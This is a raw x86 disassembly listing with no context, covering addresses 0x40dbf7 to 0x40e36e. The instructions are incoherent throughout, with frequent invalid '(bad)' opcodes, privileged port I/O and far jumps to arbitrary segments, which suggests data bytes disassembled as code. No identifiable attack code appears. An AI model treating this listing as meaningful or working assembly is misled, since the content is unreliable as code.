  40dbf7:	push   ebx
  40dbf8:	xchg   esp,eax
  40dbf9:	loop   0x40db9a
  40dbfb:	mov    dh,0xe2
  40dbfd:	mov    dl,0xad
  40dbff:	xor    eax,0x701c1330
  40dc04:	ror    BYTE PTR [ecx-0x5c227b39],cl
  40dc0a:	in     al,dx
  40dc0b:	test   al,0x6a
  40dc0d:	add    edx,DWORD PTR [eax+0x24e43166]
  40dc13:	adc    DWORD PTR [ecx+ebp*8],0x4d757b5c
  40dc1a:	and    al,0x39
  40dc1c:	dec    eax
  40dc1d:	sub    DWORD PTR [edx+0x3afc2293],eax
  40dc23:	lahf   
  40dc24:	jmp    0x58efe69f
  40dc29:	mov    es,esp
  40dc2b:	cmp    eax,0xb24ed596
  40dc30:	loop   0x40dc2b
  40dc32:	out    dx,eax
  40dc33:	(bad)  
  40dc34:	jae    0x40dbee
  40dc36:	mov    cs,edx
  40dc38:	ds inc eax
  40dc3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc3b:	shl    DWORD PTR [eax+ebp*2-0x30],1
  40dc3f:	and    ebp,DWORD PTR [eax]
  40dc41:	imul   edi,DWORD PTR [eax-0x66240739],0xdecc0d00
  40dc4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc4c:	scas   eax,DWORD PTR es:[edi]
  40dc4d:	call   FWORD PTR [edx-0x6c4d3520]
  40dc53:	ds inc edx
  40dc55:	or     bl,ah
  40dc57:	(bad)  
  40dc58:	ror    ebp,cl
  40dc5a:	rcl    BYTE PTR [eax],cl
  40dc5c:	lahf   
  40dc5d:	outs   dx,BYTE PTR ds:[esi]
  40dc5e:	test   eax,0x3bc1259b
  40dc63:	xchg   edi,eax
  40dc64:	ds out dx,al
  40dc66:	xchg   ecx,eax
  40dc67:	out    dx,al
  40dc68:	mov    cl,0x10
  40dc6a:	sti    
  40dc6b:	rol    BYTE PTR [esi+0xf],0x97
  40dc6f:	pop    edi
  40dc70:	sar    ebp,1
  40dc72:	dec    ebx
  40dc73:	xchg   edi,eax
  40dc74:	sbb    al,0x98
  40dc76:	outs   dx,BYTE PTR ds:[esi]
  40dc77:	jmp    0x7ba78f9
  40dc7c:	push   esi
  40dc7d:	fs sti 
  40dc7f:	xchg   edi,eax
  40dc81:	imul   esp,DWORD PTR [edx+0x2fd6d9a8],0x1c
  40dc88:	(bad)  
  40dc89:	xor    DWORD PTR [ebx-0x5af25b36],esi
  40dc8f:	dec    esp
  40dc90:	pop    ebx
  40dc91:	sub    BYTE PTR [edi],0xe6
  40dc94:	mov    al,0x46
  40dc96:	adc    al,0x4c
  40dc98:	mov    eax,gs:0x6d7c9a8c
  40dc9e:	pop    ecx
  40dc9f:	shl    ah,1
  40dca1:	sbb    dl,BYTE PTR [ebp-0x36]
  40dca4:	sbb    DWORD PTR [eax-0x109d5e11],0xfffffff0
  40dcab:	dec    ebx
  40dcac:	and    cl,BYTE PTR [edi+eiz*1-0x79]
  40dcb0:	vshufpd ymm4,ymm6,YMMWORD PTR [esi],0xde
  40dcb5:	scas   al,BYTE PTR es:[edi]
  40dcb6:	imul   edi,DWORD PTR [ebx],0x46
  40dcb9:	xchg   edi,eax
  40dcba:	cmp    dl,dh
  40dcbc:	lahf   
  40dcbd:	rcl    DWORD PTR [ecx+0x67],0x26
  40dcc1:	and    esi,DWORD PTR [edx+0x6]
  40dcc4:	sti    
  40dcc5:	stos   DWORD PTR es:[edi],eax
  40dcc6:	mov    dl,0x94
  40dcc8:	sbb    dl,ch
  40dcca:	cld    
  40dccb:	push   esp
  40dccc:	int3   
  40dccd:	aas    
  40dcce:	jae    0x40dd2a
  40dcd0:	push   esp
  40dcd1:	sub    eax,0xfb90c2cc
  40dcd6:	jl     0x40dc80
  40dcd8:	mov    bh,0x50
  40dcda:	jnp    0x40dcca
  40dcdc:	and    al,0x12
  40dcde:	add    dl,BYTE PTR [ebx-0x6b5da1]
  40dce4:	adc    DWORD PTR [esi],edi
  40dce6:	inc    edi
  40dce7:	xor    al,0xac
  40dce9:	xchg   ebx,eax
  40dcea:	adc    bh,BYTE PTR [ebx+0x70d6406d]
  40dcf0:	test   al,0x38
  40dcf2:	enter  0xbb80,0x6d
  40dcf6:	in     al,0xa3
  40dcf8:	mov    dl,0x7b
  40dcfa:	fsub   QWORD PTR [ebx+0x563f79ab]
  40dd00:	push   ss
  40dd01:	dec    ecx
  40dd02:	push   cs
  40dd03:	enter  0xe87c,0x97
  40dd07:	out    0x6b,eax
  40dd09:	js     0x40dd27
  40dd0b:	test   al,0x81
  40dd0d:	or     ch,dh
  40dd0f:	in     al,0xfb
  40dd11:	test   al,0x31
  40dd13:	mov    cl,0x22
  40dd15:	retf   0x68de
  40dd18:	rol    BYTE PTR [edx-0x58477a0a],0x10
  40dd1f:	sbb    DWORD PTR [edi+0x33],eax
  40dd22:	or     eax,0x4bc6923b
  40dd27:	pop    es
  40dd28:	push   0xc7f32dcb
  40dd2d:	cmc    
  40dd2e:	mov    ds,WORD PTR [esi+0x192d6b46]
  40dd34:	mov    dl,0x44
  40dd36:	test   BYTE PTR [ebp+ebx*2+0x3ebe36e0],dl
  40dd3d:	loop   0x40dd72
  40dd3f:	imul   sp,di,0x29
  40dd43:	and    BYTE PTR [edi-0x53],bh
  40dd46:	sub    DWORD PTR [edi+ebx*2-0x1473084b],ebp
  40dd4d:	ret    
  40dd4e:	jmp    0x10535876
  40dd53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd54:	push   eax
  40dd55:	leave  
  40dd56:	mov    ebx,0x943f270a
  40dd5b:	fidivr WORD PTR [eax+0x674b2061]
  40dd61:	scas   eax,DWORD PTR es:[edi]
  40dd62:	dec    esp
  40dd63:	fadd   DWORD PTR [eax]
  40dd65:	fstp   QWORD PTR [ebx+ebx*4+0x1af1535a]
  40dd6c:	pop    eax
  40dd6d:	je     0x40ddb9
  40dd6f:	adc    ch,al
  40dd71:	mov    ebp,0x90d9fdbf
  40dd76:	mov    ecx,0xc506f8b8
  40dd7b:	js     0x40dd29
  40dd7d:	push   0xac48d01
  40dd82:	daa    
  40dd83:	inc    ebp
  40dd84:	out    0x2e,al
  40dd86:	in     eax,0x33
  40dd88:	in     al,0xe3
  40dd8a:	xadd   DWORD PTR [eax],edx
  40dd8d:	mov    edx,0xc4d9855
  40dd92:	mov    bl,0xf0
  40dd94:	adc    eax,0x7d5d4b8e
  40dd99:	add    bh,al
  40dd9b:	hlt    
  40dd9c:	and    al,0x2
  40dd9e:	adc    ebx,DWORD PTR es:[edx+eiz*1]
  40dda2:	loope  0x40ddb5
  40dda4:	pop    ebx
  40dda5:	in     eax,0x85
  40dda7:	jmp    0x76c4:0xbecd950d
  40ddae:	js     0x40ddb3
  40ddb0:	sub    bl,BYTE PTR [edi]
  40ddb2:	dec    ecx
  40ddb3:	cwde   
  40ddb4:	dec    edi
  40ddb5:	popf   
  40ddb6:	retf   0x2012
  40ddb9:	rcr    BYTE PTR [ebx-0x13],1
  40ddbc:	xchg   DWORD PTR [ebx+0x43],edi
  40ddbf:	adc    BYTE PTR [edi-0xd],0xd4
  40ddc3:	ins    BYTE PTR es:[edi],dx
  40ddc4:	fild   WORD PTR [ecx-0x4c]
  40ddc7:	(bad)  
  40ddc8:	pop    esp
  40ddc9:	call   0xaf8f85f7
  40ddce:	push   ss
  40ddcf:	in     al,0xe
  40ddd1:	ror    BYTE PTR [ecx],1
  40ddd3:	sbb    al,0xbf
  40ddd5:	stos   BYTE PTR es:[edi],al
  40ddd6:	into   
  40ddd7:	mov    DWORD PTR [esi+0x447e5685],esp
  40dddd:	dec    ebp
  40ddde:	aad    0xb1
  40dde0:	in     al,0xc5
  40dde2:	stos   DWORD PTR es:[edi],eax
  40dde3:	sti    
  40dde4:	mov    dh,0x72
  40dde6:	lahf   
  40dde7:	inc    edx
  40dde8:	pop    esp
  40dde9:	push   ecx
  40ddea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddeb:	sub    eax,0x462e028a
  40ddf0:	sub    bh,BYTE PTR [eax+0x4f1d14be]
  40ddf6:	xchg   ebp,eax
  40ddf7:	mov    edx,0x6dc48985
  40ddfc:	fld    QWORD PTR [eax-0x48169e2c]
  40de02:	or     DWORD PTR [ecx],esp
  40de04:	call   0xe5254626
  40de09:	jmp    0x4609:0x55e99aa0
  40de10:	jbe    0x40de46
  40de12:	pop    esp
  40de13:	(bad)  
  40de14:	mov    esi,0x751f7839
  40de19:	mov    DWORD PTR [ebx+ebx*1-0x49],ebp
  40de1d:	aam    0x61
  40de1f:	xchg   ebp,eax
  40de20:	ins    DWORD PTR es:[edi],dx
  40de21:	jle    0x40dde3
  40de23:	xchg   ecx,eax
  40de24:	in     al,dx
  40de25:	mov    ebx,0x733b908d
  40de2a:	jmp    0x40de5e
  40de2c:	sahf   
  40de2d:	ja     0x40ddb9
  40de2f:	add    dh,dl
  40de31:	mov    ds:0x53551ed0,al
  40de36:	ds retf 
  40de38:	lds    edi,FWORD PTR [eax-0x4c]
  40de3b:	jb     0x40de3d
  40de3d:	sub    eax,0xafaddc26
  40de42:	dec    ebx
  40de43:	enter  0x1cb4,0x23
  40de47:	add    bl,ch
  40de49:	mov    al,0xe5
  40de4b:	(bad)  
  40de4d:	pusha  
  40de4e:	pusha  
  40de4f:	popf   
  40de50:	cmp    esp,edx
  40de52:	jne    0x40debd
  40de54:	push   esp
  40de55:	add    esi,ebp
  40de57:	mov    WORD PTR [eax-0x6b],ss
  40de5a:	fild   QWORD PTR [ebx+0x1a027751]
  40de60:	popa   
  40de61:	push   ds
  40de62:	ins    BYTE PTR es:[di],dx
  40de64:	xor    bl,0x9f
  40de67:	imul   edi,DWORD PTR [ecx+esi*4-0x18],0x2f82babe
  40de6f:	mov    ds:0x9acee613,al
  40de75:	bound  esi,QWORD PTR [ecx+0x1c580c62]
  40de7b:	xchg   cl,ch
  40de7d:	mov    ebp,0xff26165c
  40de82:	(bad)  
  40de83:	mov    esp,ebp
  40de85:	sub    al,cl
  40de87:	cdq    
  40de88:	icebp  
  40de89:	mov    WORD PTR [esi-0x67],es
  40de8c:	mov    edi,edx
  40de8e:	sbb    al,BYTE PTR [eax+0x362d924f]
  40de94:	fisubr DWORD PTR [esi]
  40de96:	mov    edx,0x79a43f0f
  40de9b:	fldcw  WORD PTR [edx]
  40de9d:	or     eax,0x87e1f725
  40dea2:	outs   dx,BYTE PTR ds:[esi]
  40dea3:	and    BYTE PTR [esi],ah
  40dea5:	push   edi
  40dea6:	out    0xe0,al
  40dea8:	adc    al,0x5c
  40deaa:	aam    0xba
  40deac:	xchg   ecx,eax
  40dead:	push   esp
  40deae:	jno    0x40defb
  40deb0:	sub    edi,DWORD PTR [ecx]
  40deb2:	cwde   
  40deb3:	iret   
  40deb4:	mov    bh,0x8c
  40deb6:	pushf  
  40deb7:	lahf   
  40deb8:	jge    0x40de70
  40deba:	jmp    0x90ab2a9
  40debf:	loop   0x40decb
  40dec1:	or     al,0x14
  40dec3:	xchg   ecx,eax
  40dec4:	inc    ecx
  40dec5:	in     eax,dx
  40dec6:	out    dx,eax
  40dec7:	inc    edi
  40dec8:	add    dl,al
  40deca:	xor    BYTE PTR [eax-0x78c66c5c],bh
  40ded0:	xchg   edi,eax
  40ded1:	dec    eax
  40ded2:	mov    ecx,0x39050f08
  40ded7:	dec    esi
  40ded8:	int3   
  40ded9:	mov    bl,0xee
  40dedb:	mov    ds:0x5ca66527,eax
  40dee0:	sbb    ecx,DWORD PTR [edi-0x37ad3b8d]
  40dee6:	mov    dh,0xb8
  40dee8:	mov    dh,0x49
  40deea:	cld    
  40deeb:	cld    
  40deec:	push   edi
  40deed:	add    ebx,ebp
  40deef:	adc    dl,cl
  40def1:	push   esp
  40def2:	out    dx,eax
  40def3:	scas   al,BYTE PTR es:[edi]
  40def4:	cmp    BYTE PTR [ebx-0x8c675f0],bl
  40defa:	jno    0x40df3f
  40defc:	mov    esi,0xe164a96f
  40df01:	jl     0x40df56
  40df03:	cs ret 
  40df05:	xchg   ebx,eax
  40df06:	les    ebp,FWORD PTR [edx+0x35]
  40df09:	cmp    eax,0xb832c06c
  40df0e:	or     edx,DWORD PTR [eax-0x4d]
  40df11:	or     edx,ebx
  40df13:	pushf  
  40df14:	jg     0x40ded7
  40df16:	jo     0x40debe
  40df18:	popa   
  40df19:	fcomi  st,st(6)
  40df1b:	push   edi
  40df1c:	aas    
  40df1d:	mov    eax,ds:0x853cd2e0
  40df22:	das    
  40df23:	mov    DWORD PTR [ebp-0x4a941a5c],esp
  40df29:	xor    DWORD PTR [ebx+0x5752933b],0xfbb8e0ad
  40df33:	in     al,dx
  40df34:	xchg   ebp,eax
  40df35:	or     ah,BYTE PTR [esi]
  40df37:	or     BYTE PTR gs:[eax],ah
  40df3a:	sbb    bl,ah
  40df3c:	cmp    bh,0x87
  40df3f:	jno    0x40df3d
  40df41:	test   DWORD PTR ds:0xfc492e29,esp
  40df47:	(bad)  
  40df48:	cli    
  40df49:	cmp    eax,0x7ed124c3
  40df4e:	mov    esp,0x2122ab6f
  40df53:	js     0x40dfcd
  40df55:	popa   
  40df56:	jo     0x40dfab
  40df58:	inc    edx
  40df59:	xor    al,0xd5
  40df5b:	ret    0x1635
  40df5e:	mov    dl,0xcd
  40df60:	clc    
  40df61:	sbb    dh,BYTE PTR [esi]
  40df63:	xor    DWORD PTR [esi],0xf612ce56
  40df69:	daa    
  40df6a:	mov    esp,0xb3475fe
  40df6f:	pop    ebp
  40df70:	mov    edx,0xb57b87ac
  40df75:	repnz dec edi
  40df77:	fisttp DWORD PTR [edx+eiz*4]
  40df7a:	jo     0x40df3c
  40df7c:	clc    
  40df7d:	out    dx,al
  40df7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df7f:	mov    dh,0x1b
  40df81:	pop    ebp
  40df82:	icebp  
  40df83:	icebp  
  40df84:	in     eax,0x12
  40df86:	loop   0x40df2a
  40df88:	call   0x63b50269
  40df8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df8e:	push   eax
  40df8f:	xor    DWORD PTR [ecx],ecx
  40df91:	pop    eax
  40df92:	rol    dh,0xb5
  40df95:	pop    esp
  40df96:	(bad)  
  40df97:	aad    0xa2
  40df99:	popa   
  40df9a:	je     0x40df68
  40df9c:	dec    eax
  40df9d:	push   edi
  40df9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df9f:	xor    DWORD PTR [ecx],ecx
  40dfa1:	pop    ss
  40dfa2:	sub    eax,0xc263080a
  40dfa7:	jns    0x40df34
  40dfa9:	bound  eax,QWORD PTR [ecx]
  40dfab:	xchg   esi,eax
  40dfac:	add    al,0xc5
  40dfae:	pop    ds
  40dfaf:	mov    ah,0x1b
  40dfb1:	adc    DWORD PTR [ebx-0x33d06c8a],ebx
  40dfb7:	inc    esp
  40dfb8:	add    esp,DWORD PTR [eax]
  40dfba:	xchg   esp,eax
  40dfbb:	cdq    
  40dfbc:	jne    0x40df63
  40dfbe:	sub    eax,0x8d800dca
  40dfc3:	push   eax
  40dfc4:	mov    esp,0xc2446ecd
  40dfc9:	jle    0x40dfee
  40dfcb:	and    eax,0xfe5ccf4
  40dfd0:	sub    bh,BYTE PTR [esi-0x62df273e]
  40dfd6:	mov    eax,ds:0x5b5f9f79
  40dfdb:	mov    ds:0xfa4e0047,al
  40dfe0:	ret    
  40dfe1:	push   edx
  40dfe2:	shr    DWORD PTR [eax-0x77],1
  40dfe5:	leave  
  40dfe6:	shl    DWORD PTR [esi-0xc7ea7fb],1
  40dfec:	xchg   edi,eax
  40dfed:	xchg   edx,eax
  40dfee:	push   ebx
  40dfef:	mov    dl,0xe
  40dff1:	test   edi,ebx
  40dff3:	mov    eax,0x7109e3b0
  40dff8:	fld    st(1)
  40dffa:	pushf  
  40dffb:	pop    es
  40dffc:	add    bl,BYTE PTR [ebp+0x14]
  40dfff:	mov    cs,ebp
  40e001:	cmp    esi,ebp
  40e003:	cmp    eax,0xb6aa4634
  40e008:	loopne 0x40e031
  40e00a:	adc    eax,0x2b43ddf1
  40e00f:	mov    ebx,0x7ab082c2
  40e014:	mov    BYTE PTR [eax+edx*8-0xd57dd96],al
  40e01b:	fistp  QWORD PTR [ecx-0x49]
  40e01e:	loop   0x40dff7
  40e020:	fsubr  QWORD PTR [edi-0x15]
  40e023:	sbb    eax,0x4b90feb4
  40e028:	push   eax
  40e029:	mov    ds:0x317373f7,eax
  40e02e:	scas   eax,DWORD PTR es:[edi]
  40e02f:	push   ds
  40e030:	loopne 0x40e09f
  40e032:	test   dh,dh
  40e034:	xchg   DWORD PTR [esp+ecx*1],eax
  40e037:	fs loope 0x40e081
  40e03a:	shr    BYTE PTR [eax+0xd320ba7],cl
  40e040:	mov    cs,WORD PTR [ebp-0x1e]
  40e043:	mov    bh,0x9e
  40e045:	push   edx
  40e046:	rcl    BYTE PTR [edi+0x15],1
  40e049:	mov    bl,0xae
  40e04b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e04c:	sbb    al,0x84
  40e04e:	mov    ds:0x96144336,eax
  40e053:	xchg   ebp,eax
  40e054:	xor    eax,0xb7fdc455
  40e059:	iret   
  40e05a:	xchg   al,ah
  40e05c:	icebp  
  40e05d:	xor    DWORD PTR [edx],ebp
  40e05f:	jne    0x40e0a7
  40e061:	xlat   BYTE PTR ds:[ebx]
  40e062:	jo     0x40e0a9
  40e064:	ret    0x3c39
  40e067:	call   0x3237:0x758a0353
  40e06e:	jp     0x40e041
  40e070:	(bad)
  40e074:	push   edi
  40e075:	adc    DWORD PTR [ebx+0x5bdae43f],eax
  40e07b:	inc    esp
  40e07c:	xor    BYTE PTR [ecx-0x51e71b55],bh
  40e082:	test   DWORD PTR [esi+0x5a],eax
  40e085:	jne    0x40e0b5
  40e087:	push   edi
  40e088:	xor    bl,dh
  40e08a:	xlat   BYTE PTR ds:[ebx]
  40e08b:	daa    
  40e08c:	leavew 
  40e08e:	(bad)  
  40e08f:	lahf   
  40e090:	jge    0x40e111
  40e092:	not    BYTE PTR [ecx]
  40e094:	cli    
  40e095:	sbb    DWORD PTR [eax-0x7f7e4ebd],ebx
  40e09b:	adc    esp,DWORD PTR [eax+eax*8-0x2f5bdcb3]
  40e0a2:	push   ebx
  40e0a3:	cmp    DWORD PTR ds:0xfa517d44,esi
  40e0a9:	sahf   
  40e0aa:	push   ds
  40e0ab:	fimul  DWORD PTR [eax+0x5e]
  40e0ae:	adc    esi,DWORD PTR [edx]
  40e0b0:	add    esp,DWORD PTR [esp+eax*8+0xd]
  40e0b4:	ror    al,1
  40e0b6:	pop    edi
  40e0b7:	adc    esp,edi
  40e0b9:	mov    bh,BYTE PTR [edi-0x35]
  40e0bc:	call   0xc00:0x4fbb2591
  40e0c3:	retf   0x7f05
  40e0c6:	sub    dh,ah
  40e0c8:	addr16 lahf 
  40e0ca:	and    BYTE PTR [esi+0x1a],dh
  40e0cd:	lahf   
  40e0ce:	test   DWORD PTR [esi],edx
  40e0d0:	adc    eax,0x7063e713
  40e0d5:	pop    es
  40e0d6:	retf   
  40e0d7:	mov    ch,cl
  40e0d9:	sbb    al,0xe
  40e0db:	(bad)  
  40e0dc:	mov    ah,0x40
  40e0de:	fbstp  TBYTE PTR [ebx+ebp*8]
  40e0e1:	pop    esp
  40e0e2:	call   0x6660:0x61f45b0c
  40e0e9:	add    eax,0xaf5649f1
  40e0ee:	ds stos BYTE PTR es:[edi],al
  40e0f0:	mov    ebx,0x2f40c832
  40e0f5:	mov    al,ds:0x1ef00fee
  40e0fa:	or     al,0x21
  40e0fc:	mov    ch,BYTE PTR [edi+0x37]
  40e0ff:	mov    ebx,0xf4c2fb3a
  40e104:	fisttp DWORD PTR [edi+0x6f]
  40e107:	push   0x9bdf180c
  40e10c:	repnz xlat BYTE PTR ds:[ebx]
  40e10e:	or     edx,DWORD PTR ds:0x66b3a3f2
  40e114:	mov    al,ds:0xea6b7281
  40e119:	data16 mov bh,0xb2
  40e11c:	or     al,0xaa
  40e11e:	add    eax,DWORD PTR [ecx-0x61fd4542]
  40e124:	repnz test eax,0xb6db0a78
  40e12a:	dec    ebx
  40e12b:	add    BYTE PTR [edx+ecx*4-0x46],0x2b
  40e130:	adc    DWORD PTR [eax],esp
  40e132:	pushf  
  40e133:	pop    ebp
  40e134:	adc    eax,edx
  40e136:	push   ebp
  40e137:	leave  
  40e138:	xlat   BYTE PTR ds:[ebx]
  40e139:	pusha  
  40e13a:	in     eax,0x3c
  40e13c:	push   ebx
  40e13d:	in     eax,0x99
  40e13f:	scas   al,BYTE PTR es:[edi]
  40e140:	scas   eax,DWORD PTR es:[edi]
  40e141:	shr    BYTE PTR [eax+0x3c],0x24
  40e145:	iret   
  40e146:	(bad)  
  40e147:	repz js 0x40e0e1
  40e14a:	leave  
  40e14b:	dec    eax
  40e14c:	js     0x40e17e
  40e14e:	cdq    
  40e14f:	push   0x45448cc0
  40e154:	add    BYTE PTR [ecx+0x7ce3f1c3],bl
  40e15a:	add    eax,0xf5597b2f
  40e15f:	btr    DWORD PTR [ebp+0x52571982],0x2
  40e167:	jnp    0x40e165
  40e169:	dec    edi
  40e16a:	cmp    BYTE PTR [edx-0x43867705],ch
  40e170:	loop   0x40e199
  40e172:	inc    edi
  40e173:	dec    eax
  40e174:	in     al,dx
  40e175:	jmp    DWORD PTR [edx-0x26b0b5de]
  40e17b:	cmp    DWORD PTR [esi-0x44],ecx
  40e17e:	inc    edi
  40e17f:	es push es
  40e181:	cli    
  40e182:	dec    eax
  40e183:	add    ebx,ebp
  40e185:	(bad)  
  40e186:	xlat   BYTE PTR ds:[ebx]
  40e187:	pop    ss
  40e188:	ror    BYTE PTR [edx+0x620f194b],0x82
  40e18f:	addr16 shl ah,cl
  40e192:	jno    0x40e158
  40e194:	mov    ds:0x2bbea3e7,al
  40e199:	xchg   edi,eax
  40e19a:	stos   DWORD PTR es:[edi],eax
  40e19b:	or     cl,BYTE PTR [esi+edi*8+0x45d01bc5]
  40e1a2:	mov    ah,0xb2
  40e1a4:	das    
  40e1a5:	nop
  40e1a6:	fsubp  st(7),st
  40e1a8:	adc    DWORD PTR [edi],ebp
  40e1aa:	scas   al,BYTE PTR es:[edi]
  40e1ab:	adc    dh,BYTE PTR [ebp-0xd]
  40e1ae:	lds    ebx,FWORD PTR [eax-0x15]
  40e1b1:	lea    edx,[esi-0x1e]
  40e1b4:	lea    esi,[edi-0x364e7dd8]
  40e1ba:	sub    esi,ebx
  40e1bc:	mov    esp,DWORD PTR [edi]
  40e1be:	iret   
  40e1bf:	and    ah,BYTE PTR [ecx]
  40e1c1:	sbb    eax,0x862cea84
  40e1c6:	(bad)  [esi]
  40e1c8:	sub    eax,0x34a41a90
  40e1cd:	or     BYTE PTR [ecx-0x34],al
  40e1d0:	pusha  
  40e1d1:	lods   al,BYTE PTR ds:[esi]
  40e1d2:	and    DWORD PTR [esi+0x38],eax
  40e1d5:	lea    esp,[ecx]
  40e1d7:	jge    0x40e18e
  40e1d9:	out    0xe8,eax
  40e1db:	and    DWORD PTR [ecx],ebx
  40e1dd:	into   
  40e1de:	in     al,0x5f
  40e1e0:	pop    es
  40e1e1:	les    edi,FWORD PTR [edx+0x38d79644]
  40e1e7:	pop    ecx
  40e1e8:	retf   0xb200
  40e1eb:	add    BYTE PTR [ebp+0x44],dh
  40e1ee:	inc    edx
  40e1ef:	ins    BYTE PTR es:[edi],dx
  40e1f0:	ins    DWORD PTR es:[edi],dx
  40e1f1:	(bad)  
  40e1f2:	popa   
  40e1f3:	adc    BYTE PTR [esi],dl
  40e1f5:	mov    dh,0x98
  40e1f7:	push   edi
  40e1f8:	out    dx,al
  40e1f9:	and    BYTE PTR [ecx],0xcb
  40e1fc:	lds    eax,FWORD PTR [eax-0x146887b4]
  40e202:	fwait
  40e203:	cmp    al,0xa3
  40e205:	push   cs
  40e206:	xchg   DWORD PTR [ebx+ebx*1-0x201bc9c8],esp
  40e20d:	out    dx,al
  40e20e:	jg     0x40e1cc
  40e210:	aas    
  40e211:	jnp    0x40e261
  40e213:	push   ss
  40e214:	sub    dl,al
  40e216:	lods   eax,DWORD PTR ds:[esi]
  40e217:	sub    ch,BYTE PTR [esi+0x437375de]
  40e21d:	lods   eax,DWORD PTR ds:[esi]
  40e21e:	or     bh,BYTE PTR [ebp-0x74]
  40e221:	mov    ebx,0xfb2ca19c
  40e226:	cwde   
  40e227:	inc    esi
  40e228:	push   ss
  40e229:	mov    gs,WORD PTR [eax]
  40e22b:	retf   0x6510
  40e22e:	jb     0x40e1fc
  40e230:	mov    ch,0x2f
  40e232:	mov    ds:0x12e4e9ef,al
  40e237:	fisub  WORD PTR [edx]
  40e239:	dec    BYTE PTR [ebp-0x4f43c2eb]
  40e23f:	in     eax,dx
  40e240:	sbb    ch,BYTE PTR ds:0x24483533
  40e246:	or     al,0xe3
  40e248:	cmp    eax,DWORD PTR [edx]
  40e24a:	(bad)  
  40e24b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e24c:	lea    esi,[ecx*2-0x1ea0449f]
  40e253:	lods   al,BYTE PTR ds:[esi]
  40e254:	sub    edx,0x24e4a69c
  40e25a:	js     0x40e2d3
  40e25c:	or     ah,BYTE PTR [ecx+0x16]
  40e25f:	js     0x40e29b
  40e261:	jg     0x40e21d
  40e263:	(bad)  
  40e264:	rcl    DWORD PTR [eax+ebp*8],0x6
  40e268:	inc    edi
  40e269:	leave  
  40e26a:	scas   eax,DWORD PTR es:[edi]
  40e26b:	enter  0xcf39,0x7d
  40e26f:	push   ecx
  40e270:	push   0xf0f53a07
  40e275:	inc    ebp
  40e276:	lods   al,BYTE PTR ds:[esi]
  40e277:	add    eax,0x3bdd67cc
  40e27c:	push   ss
  40e27d:	hlt    
  40e27e:	fwait
  40e27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e280:	push   es
  40e281:	push   ebx
  40e282:	popf   
  40e283:	mov    dh,BYTE PTR [eax-0x3e]
  40e286:	(bad)  
  40e287:	mov    al,0xff
  40e289:	xor    al,0x1a
  40e28b:	fidiv  WORD PTR [esi+0x73]
  40e28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e28f:	add    edi,ecx
  40e291:	loope  0x40e280
  40e293:	mov    ebp,0x59550e05
  40e298:	fwait
  40e299:	xor    BYTE PTR [esi-0xb],dh
  40e29c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e29d:	std    
  40e29e:	sub    eax,0xec2568f5
  40e2a3:	add    DWORD PTR [ebx+0x74370c23],eax
  40e2a9:	test   DWORD PTR [ebp-0x7747bdf8],0x5d8c7d98
  40e2b3:	(bad)  
  40e2b4:	das    
  40e2b5:	pop    ecx
  40e2b6:	adc    DWORD PTR es:[esi+0x4],edi
  40e2ba:	xchg   dx,ax
  40e2bc:	mov    eax,ds:0x11f8139b
  40e2c1:	xlat   BYTE PTR ds:[ebx]
  40e2c2:	adc    DWORD PTR [ebx],0x977eef14
  40e2c8:	sahf   
  40e2c9:	jge    0x40e28e
  40e2cb:	cld    
  40e2cc:	ret    0x42af
  40e2cf:	push   esi
  40e2d0:	sbb    ecx,DWORD PTR [esi]
  40e2d2:	jge    0x40e2cf
  40e2d4:	add    esp,DWORD PTR [eax]
  40e2d6:	scas   al,BYTE PTR es:[edi]
  40e2d7:	mov    ah,0x6a
  40e2d9:	pop    edx
  40e2da:	pop    ebp
  40e2db:	ror    DWORD PTR [eax-0x5b849ac5],1
  40e2e1:	mov    esp,0xd3a5d86d
  40e2e6:	jnp    0x40e35a
  40e2e8:	call   0x7b1b07bc
  40e2ed:	jne    0x40e2fb
  40e2ef:	sub    eax,DWORD PTR [esi+0x5f]
  40e2f2:	out    0x84,al
  40e2f4:	xchg   edi,eax
  40e2f5:	mov    edi,0x4bc0ce28
  40e2fa:	pop    es
  40e2fb:	adc    al,BYTE PTR [ecx-0x4ee80a6f]
  40e301:	inc    ecx
  40e302:	jo     0x40e2e4
  40e304:	add    DWORD PTR [ecx-0x75],ecx
  40e307:	stos   DWORD PTR es:[edi],eax
  40e308:	leave  
  40e309:	mov    DWORD PTR [edx+0x4d3919d],esp
  40e30f:	add    eax,DWORD PTR [eax+ebx*4]
  40e312:	(bad)  
  40e313:	les    edi,FWORD PTR [ebp+edi*4-0x2bf5a5f9]
  40e31a:	jg     0x40e2e6
  40e31c:	leave  
  40e31d:	and    BYTE PTR [ecx+0x3a414e4d],bh
  40e323:	jnp    0x40e2b0
  40e325:	jge    0x40e35c
  40e327:	(bad)  
  40e328:	cmc    
  40e329:	fwait
  40e32a:	cwde   
  40e32b:	cmp    al,0x76
  40e32d:	mov    esi,0xb643357e
  40e332:	push   DWORD PTR [edx]
  40e334:	repz cmp al,0xc3
  40e337:	and    al,cl
  40e339:	mov    eax,ds:0xd2e9fcea
  40e33e:	ret    0x6568
  40e341:	xor    al,0xee
  40e343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e344:	xchg   ebx,eax
  40e345:	or     BYTE PTR [eax],cl
  40e347:	scas   al,BYTE PTR es:[edi]
  40e348:	xchg   ecx,eax
  40e349:	pop    esp
  40e34a:	jge    0x40e33d
  40e34c:	mov    eax,ds:0xddf36f58
  40e351:	mov    fs,WORD PTR [edi+0x51]
  40e354:	mov    bl,0xe8
  40e356:	stos   DWORD PTR es:[edi],eax
  40e357:	je     0x40e36f
  40e359:	add    dh,BYTE PTR [ecx-0xd9f56e]
  40e35f:	and    DWORD PTR [ebp+0x15],eax
  40e362:	dec    ebp
  40e363:	mov    DWORD PTR [esi-0x2eea20],0x44b5d32
  40e36d:	inc    ebp
  40e36e:	(bad)
